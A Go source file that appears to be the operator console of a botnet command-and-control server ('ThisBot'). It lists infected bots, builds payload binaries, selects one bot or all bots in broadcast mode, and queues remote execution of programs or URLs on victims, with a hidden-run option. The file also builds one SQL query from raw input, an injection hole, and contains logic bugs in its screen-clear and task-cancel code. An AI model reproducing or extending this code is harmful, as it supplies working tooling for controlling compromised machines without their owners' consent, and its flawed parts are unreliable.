package core

import (
	"ThisBot/common"
	"ThisBot/db1"
	"ThisBot/utils"
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
)

func log_handler(ary []string) {
	if len(ary) < 2 {
		fmt.Println("[💀] Usage: log [list/del/export], please enter help command")
		return
	}

	switch ary[1] {
	case "list", "l":
		list_logs()
	case "del", "d":
		del_log(ary)
	case "export", "r":
		export_logs(ary)
	}
}

func task_handler(ary []string) {
	// task [list/export]
	if len(ary) < 2 {
		fmt.Println("[💀] task [list/export], please enter help command")
		return
	}

	switch ary[1] {
	case "list", "l":
		list_tasks(ary)
	case "export", "r":
		export_tasks(ary)
	}
}

func list_handler() {
	sqlStr := "select id from clients"
	var bot common.Client
	var id int64
	rows, err := db1.QueryRows(common.Db, sqlStr)
	if err != nil {
		log.Println(err.Error())
		return
	}
	defer rows.Close()

	if !rows.Next() {
		fmt.Println("💀 💀 💀  No Bot exists")
		return
	}

	common.Mutex.Lock()
	fmt.Println("🐾 --------------------------------------------------- 🐾")
	fmt.Println("⚔️ ⚔️ ⚔️  Currrent bot: ")
	fmt.Println("🐾 --------------------------------------------------- 🐾")
	common.Mutex.Unlock()

	for {
		if rows.Scan(&id) != nil {
			fmt.Println("[💀] Error in showing botid = " + strconv.FormatInt(id, 10))
			continue
		}
		if !get_bot_info(id, &bot) {
			fmt.Println("[💀] Bot " + strconv.FormatInt(id, 10) + " doesn't exist, please enter right bot id")
			continue
		}
		show_bot_info(&bot)
		fmt.Println("")

		if !rows.Next() {
			break
		}
	}
}

func clear_handler() {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("cmd")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func build_handler() {
	payload, path := BuildPayload()
	if nil == payload {
		fmt.Println("[💀] Failed to build payload")
		return
	}
	if utils.WriteBinary(path, payload) {
		fmt.Println("[✅] Successfully built payload, path: " + path)
	} else {
		fmt.Println("[💀] Failed to build payload")
	}
}

func cancel_handler(ary []string) {
	if len(ary) < 2 {
		fmt.Println("[💀] Usage: cancel [task_id/all], please enter help command")
		return
	}
	option := strings.TrimSpace(strings.ToLower(ary[1]))

	if option == "all" {
		sqlStr := "update tasks t join logs l on l.task_id = t.id set t.status='canceled' " +
			"where l.account_id=? and (instr(t.status, 'queued') or instr(t.status, 'running'))"
		rows, err := db1.Exec(common.Db, sqlStr, common.Account)
		if err != nil {
			fmt.Println("[💀] Failed to cancel all tasks")
		} else if rows == 0 {
			fmt.Println("[💀] No task needs to be canceled")
		} else {
			// Update all status in logs
			sqlStr = "update logs set status='canceled' where account_id=? and (instr(status, 'queued') or instr(status, 'running'))"
			_, err := db1.Exec(common.Db, sqlStr, common.Account)
			if err != nil {
				fmt.Println("[✅] Cancel all tasks successfully but failed to update task logs")
				return
			}
			fmt.Println("[✅] Cancel all tasks successfully")
		}
	} else {
		sqlStr := "update tasks t join logs l on l.task_id=t.id set t.status='canceled' " +
			"where l.account_id=? and l.task_id=? and (instr(t.status, 'queued') or instr(t.status, 'running'))"
		task_id, _ := strconv.ParseInt(option, 10, 64)
		rows, err := db1.Exec(common.Db, sqlStr, common.Account, task_id)
		if err != nil {
			fmt.Printf("[💀] Failed to cancel task[%d]\n", task_id)
		} else if rows == 0 {
			fmt.Printf("[💀] Task[%d] already done\n", task_id)
		} else {
			// Update logs table
			sqlStr = "update logs set status='canceled' where account_id=? and task_id=? or (instr(status, 'queued') or instr(status, 'running'))"
			_, err := db1.Exec(common.Db, sqlStr, common.Account, task_id)
			if err != nil {
				fmt.Printf("[✅] Cancel task[%d] successfully but failed to update task log\n", task_id)
				return
			}
			fmt.Printf("[✅] Cancel task[%d] successfully\n", task_id)
		}
	}
}

func select_handler(ary []string) {
	if len(ary) < 2 {
		fmt.Println("[💀] Usage: select botid, please enter help command")
		return
	}
	// Check it's a number
	botid, err := strconv.ParseInt(ary[1], 10, 64)
	if err != nil || botid == 0 {
		fmt.Println("[💀] You need to enter a bot id which is number")
		return
	}
	// Check if bot in database record
	var bot common.Client
	if !get_bot_info(botid, &bot) {
		fmt.Println("[💀] Bot doesn't exist, please enter right bot id")
		return
	}
	// Switch mode
	common.CurrentBot = botid
	show_bot_info(&bot)
}

func exec_handler(ary []string) {
	if len(ary) < 2 {
		fmt.Println("[💀] Usage: exec [-h] path/url [args], please enter help command")
		return
	}
	var options string = ""
	var hidden bool = false

	if ary[1] == "-h" {
		hidden = true
	}

	i := 1
	if hidden {
		i++
	}

	for ; i < len(ary); i++ {
		options += " " + ary[i]
	}
	options = strings.TrimSpace(options)
	// Complete the command
	if strings.ToLower(ary[0]) == "exec" {
		ary[0] = "execute"
	}
	// Query if there's command in database
	sqlStr := "select id from commands where name='" + ary[0] + "'"

	command_id := 0
	err := db1.QueryRow(common.Db, sqlStr).Scan(&command_id)
	if err != nil {
		if err == sql.ErrNoRows {
			fmt.Println("[💀] No such command")

		} else {
			fmt.Println("[💀] Command error")
		}
		return
	}

	sqlStr = "insert into tasks (bot_id, command_id, args, status) values (?,?,?,?)"
	map_args := map[string]interface{}{
		"args":   options,
		"hidden": hidden,
	}
	byt, _ := json.Marshal(map_args)
	_, err = db1.Insert(common.Db, sqlStr, common.CurrentBot, command_id, byt, "queued")
	if err != nil {
		fmt.Println("[💀] Failed to generate command")
		return
	} else {
		fmt.Println("[✅] Generate command okay")
	}
}

func mode_handler(ary []string) {
	if len(ary) == 1 {
		if common.CurrentBot == 0 {
			fmt.Println("[✅] Broadcast mode")
		} else {
			fmt.Println("[✅] Current bot ID: " + strconv.FormatInt(common.CurrentBot, 10))
		}
	} else {
		if ary[1] == "broadcast" {
			common.CurrentBot = 0
			fmt.Println("[✅] Switch to broadmode")
		} else {
			fmt.Println("[💀] Failed to switch to broadcast mode")
		}
	}
}

func info_handler(ary []string) {
	if len(ary) < 2 {
		fmt.Println("[💀] Usage: info id, request latest bot information")
		return
	}
	botid, err := strconv.ParseInt(ary[1], 10, 64)
	if err != nil {
		fmt.Println("[💀] You need to enter a bot id which is number")
		return
	}
	var bot common.Client
	if !get_bot_info(botid, &bot) {
		fmt.Println("[💀] Bot doesn't exist, please enter right bot id")
		return
	}
	show_bot_info(&bot)
}
